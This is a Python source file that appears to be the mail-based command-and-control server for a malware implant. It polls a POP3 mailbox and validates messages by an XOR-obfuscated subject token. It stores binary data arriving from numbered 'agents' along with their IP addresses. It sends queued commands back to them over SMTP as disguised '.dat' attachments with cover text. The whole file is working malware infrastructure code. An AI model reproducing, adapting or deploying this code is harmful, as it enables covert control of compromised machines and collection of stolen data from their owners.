import logging
import time
import poplib
import smtplib
import email
# import binascii
import struct
import base64
import XABase64
import socket
import re
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase

from settings import P2_Scheme, P3_Scheme, LocalStorage, ServerLogger, POP3_MAIL_IP, SMTP_MAIL_IP, POP3_ADDR, POP3_PASS, \
    SMTP_FROM_ADDR, SMTP_PASS, SMTP_TO_ADDR


class MailServer(object):
    def __init__(self, p2_scheme, p3_scheme, local_storage, logger):
        self.LocalStorage = local_storage
        self.P2Scheme = p2_scheme
        self.P3Scheme = p3_scheme
        self.Logger = logger

    # get data from MailServer, save to fs
    def isCurrentMsg(self, msg, content):
        # print "msg.as_string() is: ", msg.as_string()
        # print "msg.get_default_type() is: ", msg.get_default_type()

        xored = None
        try:
            xored_content = base64.b64decode(content)
            xored = base64.b64decode(msg['Subject'])
        except:
            print "subject b64 error"
            return 0
        res = XABase64.xor(xored[4:], xored[:4])
        if res[:7] != self.P2Scheme.subj_token:
            print 'token is not valid'
            return 0
        else:
            return 1

    def deleteMsg(self, pop, numOfMsg):
        try:
            pop.dele(numOfMsg)
            pop.quit()
            status = 1
        except Exception as error:
            logging.error(error)
            status = 0
        return status

    def agent_ip(self, received):
        ip = ''
        try:
            ip = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', received)
        except Exception as error:
            logging.error(error)
        if len(ip):
            ip = ip[-1]
        return ip

    def recv_mail(self):
        print 'POP3: recv_mail'
        pop = None
        try:
            pop = poplib.POP3_SSL(POP3_MAIL_IP)
        except (poplib.error_proto, socket.error) as e:
            print 'POP3: ERROR: %s : %s' % (POP3_MAIL_IP, e)
            time.sleep(20)
        if pop == None:
            return
        try:
            pop.user(POP3_ADDR)
            pop.pass_(POP3_PASS)
        except poplib.error_proto, e:
            print 'POP3: ERROR: %s : %s' % (POP3_ADDR, e)
            time.sleep(20)

        if pop.stat()[0] == 0:
            print 'POP3: no messages'
            pop.quit()
            time.sleep(1)  # long sleep
            return

        for i in xrange(1, len(pop.list()[1]) + 1):
            status, alines, octets = pop.retr(i)

            msg = email.message_from_string('\n'.join(alines))
            content = alines[-2]
            if self.isCurrentMsg(msg, content) == 0:
                self.deleteMsg(pop, i)
                continue
            recived = msg.get_all('Received')
            try:
                ip = self.agent_ip(recived)
            except Exception as err:
                logging.error(err)
            # timestamp = msg.get('Date')
            timestamp = datetime.isoformat(datetime.now())
            for part in msg.walk():
                if part.get_content_type():
                    if part.get_content_type() == "application/octet-stream":
                        body = part.get_payload(decode=True)
                        if body is not None:
                            agent_id = struct.unpack('<I', body[:4])[0]
                            data = self.P3Scheme.pack_agent_data(body)
                            try:
                                meta_data = self.P3Scheme.pack_data(self.P3Scheme.separator.join([ip, timestamp]))
                            except Exception as error:
                                logging.error(error)
                                print(ip)
                                print(timestamp)

                            self.LocalStorage.save_data_from_agent(agent_id, meta_data + self.P3Scheme.separator + data)

                            info = self.P3Scheme.pack_data(self.P3Scheme.separator.join(["GET", timestamp, ip]))
                            self.LocalStorage.save_status_info_for_agent(agent_id, info)

                            # request_method = 'GET'
                            # if request_method == 'GET':
                            # info = self.P3Scheme.pack_data(self.P3Scheme.separator.join([request_method, timestamp, ip]))
                            # self.LocalStorage.save_status_info_for_agent(agent_id, info)
                            #
                            # else:
                            # meta_data = self.P3Scheme.pack_data(self.P3Scheme.separator.join([ip, timestamp]))
                            # self.LocalStorage.save_data_from_agent(agent_id, meta_data + self.P3Scheme.separator + data)
                            # self.Logger.log_message("POP3: Data saved")
                            # self.Logger.log_message("data from agent %s " % meta_data + self.P3Scheme.separator + data)
                        else:
                            print 'POP3: empty message'
                            self.deleteMsg(pop, i)
                            continue
                        if self.deleteMsg(pop, i) == 0:
                            print 'POP3: ERROR: Msg is deleted'
                            exit(1)
                            time.sleep(0.1)
                            break
            if self.deleteMsg(pop, i) == 0:
                print 'POP3: ERROR: Msg is\'t deleted'
                exit(1)
            time.sleep(0.1)
            break

    # get data from fs, send to MailServer
    # def send_mail(self, agent_id):
    #     print
    #     "SMTP: send_mail"
    #     mark, res_body = self.LocalStorage.get_data_for_agent(agent_id)
    #     if not res_body:
    #         return
    #     # print "%d"%len(res_body)
    #     # ->> P2: generate_subject
    #     # token_aid = self.P2Scheme.subj_token + struct.pack("<I", agent_id)
    #     # junk = XABase64.generate_binary_junk(5);
    #     # res = XABase64.xor(token_aid, junk)
    #     # res = junk+res
    #     # print binascii.hexlify(res)
    #     # b64subj = base64.b64encode(res)
    #     # print b64subj
    #
    #     smtp = None
    #     try:
    #         smtp = smtplib.SMTP(SMTP_MAIL_IP, 587)
    #     except (smtplib.SMTPException, socket.error) as e:
    #         print
    #         'SMTP: ERROR %s : %s' % (SMTP_MAIL_IP, e)
    #         time.sleep(20)
    #         return
    #     if smtp == None:
    #         return
    #     # smtp.set_debuglevel(1)
    #     try:
    #         smtp.ehlo()
    #         smtp.starttls()
    #         smtp.login(SMTP_FROM_ADDR, SMTP_PASS)
    #     except smtplib.SMTPException, e:
    #         print
    #         'SMTP for %s : %s' % (SMTP_FROM_ADDR, e)
    #         smtp.quit()
    #         return
    #     # remove data from file system
    #     self.LocalStorage.data_for_agent_accepted(agent_id, mark)
    #     self.Logger.log_message(">>> send command for " + str(agent_id) + "[cmd_size: " + str(len(res_body)) + "]")
    #     # init smtp message
    #     msg = MIMEMultipart('alternative')
    #     msg['Date'] = datetime.utcnow().isoformat()
    #     msg['Subject'] = 'piradi nomeri'  # b64subj
    #     msg['From'] = SMTP_FROM_ADDR
    #     msg['To'] = SMTP_TO_ADDR
    #     # load attach
    #     _attach = MIMEBase('application', 'octet-stream')
    #     _attach.set_payload(res_body)
    #     # _rand_filename = XABase64.random_string(XABase64.generate_int(5, 9)) + '.' + \
    #     #                  XABase64.random_string(XABase64.generate_int(2, 4))
    #     _attach.add_header('Content-Disposition', 'attachment',
    #                        filename='detaluri_%s.dat' % time.strftime("%d%m%Y%H%M"))
    #     # text
    #     _text = MIMEText('gamarjoba')
    #     msg.attach(_text)
    #     msg.attach(_attach)
    #     ret = smtp.sendmail(SMTP_FROM_ADDR, [SMTP_TO_ADDR], msg.as_string())
    #     print 'SMTP: Data %s ia sent' % res_body
    #     smtp.quit()
    #     time.sleep(0.1)
    def send_mail(self, agent_id):
        print "SMTP: send_mail"
        mark, res_body = self.LocalStorage.get_data_for_agent(agent_id)

        if not res_body:
            print "All Datas gone..."
            return

        smtp = None
        try:
            smtp = smtplib.SMTP(SMTP_MAIL_IP, 587)
        except (smtplib.SMTPException, socket.error) as e:
            print 'SMTP: ERROR %s : %s'%(SMTP_MAIL_IP,e)
            time.sleep(20)
            return

        if smtp == None:
            return

        try:
            smtp.ehlo()
            smtp.starttls()
            smtp.login(SMTP_FROM_ADDR, SMTP_PASS)

        except smtplib.SMTPException, e:
            print 'SMTP for %s : %s'%(SMTP_FROM_ADDR, e)
            smtp.quit()
            return

        # remove data from file system
        self.LocalStorage.data_for_agent_accepted(agent_id, mark)
        self.Logger.log_message(">>> send command for " + str(agent_id) + "[cmd_size: " + str(len(res_body)) + "]")

        # init smtp message
        msg = MIMEMultipart('alternative')
        msg['Date'] = datetime.utcnow().isoformat()
        msg['Subject'] = res_body
        msg['From'] = SMTP_FROM_ADDR
        msg['To'] = SMTP_TO_ADDR
        print "SMTP_MSG: %s" % msg

        # load attach
        _attach = MIMEBase('application', 'octet-stream')
        _attach.set_payload(res_body)

        # _rand_filename = XABase64.random_string(XABase64.generate_int(5, 9)) + '.' + \
        #                  XABase64.random_string(XABase64.generate_int(2, 4))

        _attach.add_header('Content-Disposition', 'attachment', filename='detaluri_%s.dat' % time.strftime("%d%m%Y%H%M"))
        # text
        _text = MIMEText('gamarjoba')
        msg.attach(_text)
        msg.attach(_attach)

        ret = smtp.sendmail(SMTP_FROM_ADDR, [SMTP_TO_ADDR], msg.as_string())
        print "\n" + "="*40
        print "MSG SMTP: %s" % str(msg)
        print "\n" + "="*40

        print 'SMTP: Data %s is sent' % res_body
        smtp.quit()
        time.sleep(0.1)

if __name__ == '__main__':
    mail = MailServer(p2_scheme=P2_Scheme, p3_scheme=P3_Scheme, local_storage=LocalStorage, logger=ServerLogger)
    while 1:
        # recive mail from mail server
        mail.recv_mail()
        # send mail to mail server
        agents_list = LocalStorage.get_agents_list()
        for agent_id in agents_list:
            mail.send_mail(agent_id)
